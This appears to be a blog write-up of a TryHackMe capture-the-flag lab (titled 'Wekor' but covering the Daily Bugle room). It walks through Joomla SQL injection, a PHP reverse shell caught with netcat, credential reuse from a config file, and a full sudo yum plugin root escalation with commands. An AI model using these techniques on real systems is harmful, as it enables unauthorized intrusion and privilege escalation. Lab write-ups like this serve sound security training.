---
layout: default
title: Wekor
description: THM - Wekor
---

## Enumeration

Nmap Scan:
```
Nmap scan report for 10.10.8.229
Host is up (0.067s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```
Gobuster Scan:
```
/images               (Status: 301) [Size: 234] [--> http://10.10.8.229/images/]
/media                (Status: 301) [Size: 233] [--> http://10.10.8.229/media/]
/templates            (Status: 301) [Size: 237] [--> http://10.10.8.229/templates/]
/modules              (Status: 301) [Size: 235] [--> http://10.10.8.229/modules/]
/bin                  (Status: 301) [Size: 231] [--> http://10.10.8.229/bin/]
/plugins              (Status: 301) [Size: 235] [--> http://10.10.8.229/plugins/]
/includes             (Status: 301) [Size: 236] [--> http://10.10.8.229/includes/]
/language             (Status: 301) [Size: 236] [--> http://10.10.8.229/language/]
/components           (Status: 301) [Size: 238] [--> http://10.10.8.229/components/]
/cache                (Status: 301) [Size: 233] [--> http://10.10.8.229/cache/]
/libraries            (Status: 301) [Size: 237] [--> http://10.10.8.229/libraries/]
/tmp                  (Status: 301) [Size: 231] [--> http://10.10.8.229/tmp/]
/layouts              (Status: 301) [Size: 235] [--> http://10.10.8.229/layouts/]
/administrator
```
Looking at the source we can see the website is running Joomla CMS
```
<script type="application/json" class="joomla-script-options new">{"system.keepalive":{"interval":840000,"uri":"\/index.php\/component\/ajax\/?format=json"}}</script>
```
Robots.txt file:
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
Accessing:
```
http://10.10.8.229/language/en-GB/en-GB.xml
```
Shows us that the Joomla version is 3.7.0
```
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
```
Looking around for an exploit, it appears we have found one using searchsploit, and another one on github, "Joomblah"
```
https://github.com/XiphosResearch/exploits/tree/master/Joomblah

[-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '[REDACTED]', '', '']
  -  Extracting sessions from fb9j5_session
```
So we found a user, jonah, and a hash. Cracking the hash gave us a password.

Let's try logging into joomla.

It worked!

We'll now go to "templates" and replace the "index.php" content with a php shell.
```
nc -lvnp 9002
Listening on 0.0.0.0 9002
Connection received on 10.10.8.229 37676
SOCKET: Shell has connected! PID: 3568
whoami
apache
```
From here, I'll beautify my shell and look around for interesting files.

Also, I'll run linpeas. Just open two shells.

Now, this server is vulnerable to "PwnKit". But I don't think it's the intended path, so we're not gonna use it.

After looking up and down and finding nothing, I went back to the web directory, where a "configuration.php" file was sitting.
```
$host = 'localhost';
        public $user = 'root';
        public $password = '[REDACTED]';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';

bash-4.2$ su root
su root
Password: [REDACTED]

su: Authentication failure

bash-4.2$ su jjameson
su jjameson
Password: [REDACTED]

[jjameson@dailybugle html]$ 
```
Great! We moved laterally to jjameson.

Let's see his level of access. But first, I'll ssh into the machine for a better shell.
```
ssh jjameson@10.10.8.229
jjameson@10.10.8.229's password: 
Last login: Sun Sep 24 15:19:41 2023
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$   
```
We now have the user.txt file.
```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 

```
Using yum with sudo, we can look on GTFOBins and gain root.
```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Failed to set locale, defaulting to C
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# 
```
We now have root access, we can read the flag and submit it!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/dailybugle)
